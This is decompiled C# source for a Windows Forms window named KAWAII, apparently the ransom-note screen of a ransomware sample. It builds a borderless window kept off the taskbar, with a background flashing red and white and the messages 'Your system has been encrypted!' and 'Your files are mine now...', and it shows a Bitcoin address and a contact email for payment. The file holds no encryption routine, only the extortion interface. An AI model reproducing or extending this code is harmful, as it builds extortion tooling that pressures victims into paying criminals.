using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Anime.Properties;

namespace Anime;

public class KAWAII : Form
{
	private int i = 0;

	private IContainer components = null;

	private PictureBox pictureBox2;

	private PictureBox pictureBox1;

	private Label label1;

	private Label label2;

	private Timer timer1;

	private Label label3;

	private Label label4;

	private Label label5;

	public KAWAII()
	{
		InitializeComponent();
	}

	private void timer1_Tick(object sender, EventArgs e)
	{
		if (i % 2 == 0)
		{
			((Control)this).set_BackColor(Color.Red);
			i++;
		}
		else
		{
			((Control)this).set_BackColor(Color.White);
			i++;
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_004e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0058: Expected O, but got Unknown
		//IL_0059: Unknown result type (might be due to invalid IL or missing references)
		//IL_0063: Expected O, but got Unknown
		//IL_0064: Unknown result type (might be due to invalid IL or missing references)
		//IL_006e: Expected O, but got Unknown
		//IL_006f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0079: Expected O, but got Unknown
		//IL_00c6: Unknown result type (might be due to invalid IL or missing references)
		//IL_0143: Unknown result type (might be due to invalid IL or missing references)
		//IL_01ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_01b8: Expected O, but got Unknown
		//IL_01ec: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Unknown result type (might be due to invalid IL or missing references)
		//IL_0272: Expected O, but got Unknown
		//IL_0293: Unknown result type (might be due to invalid IL or missing references)
		//IL_033b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0345: Expected O, but got Unknown
		//IL_0376: Unknown result type (might be due to invalid IL or missing references)
		//IL_03e2: Unknown result type (might be due to invalid IL or missing references)
		//IL_03ec: Expected O, but got Unknown
		//IL_0410: Unknown result type (might be due to invalid IL or missing references)
		//IL_047d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0487: Expected O, but got Unknown
		//IL_059b: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a5: Expected O, but got Unknown
		//IL_05b1: Unknown result type (might be due to invalid IL or missing references)
		components = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(KAWAII));
		pictureBox2 = new PictureBox();
		pictureBox1 = new PictureBox();
		label1 = new Label();
		label2 = new Label();
		timer1 = new Timer(components);
		label3 = new Label();
		label4 = new Label();
		label5 = new Label();
		((ISupportInitialize)pictureBox2).BeginInit();
		((ISupportInitialize)pictureBox1).BeginInit();
		((Control)this).SuspendLayout();
		pictureBox2.set_Image((Image)(object)Resources.anime2_removebg_preview);
		((Control)pictureBox2).set_Location(new Point(-18, 258));
		((Control)pictureBox2).set_Margin(new Padding(4, 3, 4, 3));
		((Control)pictureBox2).set_Name("pictureBox2");
		((Control)pictureBox2).set_Size(new Size(446, 515));
		pictureBox2.set_TabIndex(1);
		pictureBox2.set_TabStop(false);
		pictureBox1.set_Image((Image)(object)Resources.Webp_net_resizeimage);
		((Control)pictureBox1).set_Location(new Point(159, 122));
		((Control)pictureBox1).set_Margin(new Padding(4, 3, 4, 3));
		((Control)pictureBox1).set_Name("pictureBox1");
		((Control)pictureBox1).set_Size(new Size(373, 247));
		pictureBox1.set_TabIndex(2);
		pictureBox1.set_TabStop(false);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("Arial", 20.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.Black);
		((Control)label1).set_Location(new Point(212, 182));
		((Control)label1).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(216, 64));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("Your files\r\nare mine now...");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_BackColor(Color.Transparent);
		((Control)label2).set_Font(new Font("Arial", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label2).set_Location(new Point(493, 122));
		((Control)label2).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(694, 406));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		timer1.set_Enabled(true);
		timer1.set_Interval(400);
		timer1.add_Tick((EventHandler)timer1_Tick);
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Arial", 36f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_ForeColor(Color.White);
		((Control)label3).set_Location(new Point(236, 9));
		((Control)label3).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(789, 56));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Your system has been encrypted!");
		((Control)label4).set_AutoSize(true);
		((Control)label4).set_Font(new Font("Arial", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label4).set_Location(new Point(493, 593));
		((Control)label4).set_Margin(new Padding(4, 0, 4, 0));
		((Control)label4).set_Name("label4");
		((Control)label4).set_Size(new Size(758, 29));
		((Control)label4).set_TabIndex(9);
		((Control)label4).set_Text("Bitcoin address: bc1qcqr5ffr4fqd3a8e9jv6dwfkm54p5zu43mp69vs");
		((Control)label5).set_AutoSize(true);
		((Control)label5).set_Font(new Font("Arial", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)label5).set_Location(new Point(493, 670));
		((Control)label5).set_Name("label5");
		((Control)label5).set_Size(new Size(476, 29));
		((Control)label5).set_TabIndex(10);
		((Control)label5).set_Text("Email address: follina4life@outlook.com");
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 14f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(1250, 771));
		((Control)this).get_Controls().Add((Control)(object)label5);
		((Control)this).get_Controls().Add((Control)(object)label4);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox1);
		((Control)this).get_Controls().Add((Control)(object)pictureBox2);
		((Control)this).set_Font(new Font("Arial", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Margin(new Padding(4, 3, 4, 3));
		((Control)this).set_Name("KAWAII");
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("KAWAII");
		((ISupportInitialize)pictureBox2).EndInit();
		((ISupportInitialize)pictureBox1).EndInit();
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
